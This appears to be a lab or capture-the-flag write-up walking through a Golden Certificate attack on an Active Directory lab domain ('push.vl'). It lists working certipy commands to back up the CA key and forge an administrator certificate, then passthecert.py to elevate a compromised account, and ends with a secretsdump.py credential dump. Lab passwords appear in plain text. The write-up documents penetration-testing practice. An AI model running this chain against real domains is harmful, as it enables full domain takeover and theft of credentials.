---
description: >-
  Local admin on the CA box (same machine) = you can steal the key that signs
  all certificates = you can fake a Domain Admin certificate = domain
  compromised.
---

# Golden Certificate Attack

`sccadmin` has zero special permissions in Active Directory. But it doesn't need any it's a **local admin on MS01**. And since MS01 is the CA, being local admin there is basically the same as owning the whole PKI system.

Can be confirm via&#x20;

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

or&#x20;

<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Backing Up CA Keys

{% code overflow="wrap" %}
```bash
certipy ca -u sccadmin -p '7ujm&UJM' -target-ip MS01.push.vl -backup
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

#### **Forging the Certificate**

Attempt to forge a certificate for the domain administrator:

{% code overflow="wrap" %}
```bash
certipy forge -ca-pfx CA.pfx -upn administrator@push.vl -subject 'CN=Administrator,CN=Users,DC=PUSH,DC=VL'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

However, we encounter an error:

```bash
KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)
```

#### **Pass The Certificate Technique**

To bypass this restriction, we can use the Pass The Certificate technique on the kelly.hill user account that we compromised earlier.

Required tools:

* [https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py](https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py)

Reference blog post:

* [https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate)

#### **Complete Attack Chain**

Execute the following steps to complete the Pass The Certificate attack:

```bash
certipy cert -pfx administrator_forged.pfx -nokey -out administrator.crt
```

```bash
certipy cert -pfx administrator_forged.pfx -nocert -out administrator.key
```

```bash
python3 ~/tools/PassTheCert/Python/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -target kelly.hill -elevate -domain push.vl -dc-host dc01.push.vl
```

Done Domain Compromised&#x20;

{% code overflow="wrap" %}
```
secretsdump.py 'kelly.hill:ShinraTensei!'@dc01.push.vl                              
```
{% endcode %}
